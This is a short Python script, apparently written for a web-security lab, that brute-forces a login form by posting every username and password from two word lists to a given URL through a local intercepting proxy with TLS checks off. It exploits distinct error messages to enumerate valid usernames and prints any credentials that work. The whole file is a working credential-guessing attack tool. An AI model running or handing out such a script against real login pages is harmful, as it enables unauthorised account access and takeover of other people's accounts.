import requests
import urllib3
import sys
#dedoxd2

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
    }
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def  brute_force_login(url :str) : 
    with open("./usernames", "r") as user_file:
        usernames = [line.strip() for line in user_file]  # Store all usernames in a list
        
    with open("./passwords", "r") as pass_file:
        passwords = [line.strip() for line in pass_file]  # Store all passwords in a list


    for username in usernames:
        for passwd in passwords : 
            params = {"username":username.rstrip() , "password":passwd.rstrip() }
            response = requests.post(url,verify=False,proxies=proxies,data=params)
            
            if  "Invalid username" in response.text:
                break
            if "Invalid username" not in response.text and "Incorrect password" not in response.text:
                print(f"(+) Credentials worked: username: {username}, password: {passwd}")
                #print(response.text)
if __name__ == "__main__":
    try:
        url = sys.argv[1]
        brute_force_login(url)

    except RuntimeError:
        print(RuntimeError)
        print("(-) Usage: %s <url>  "%sys.argv[0])
        print("(-) Example: %s https://www.example.com/login " %sys.argv[0])
        sys.exit(-1)
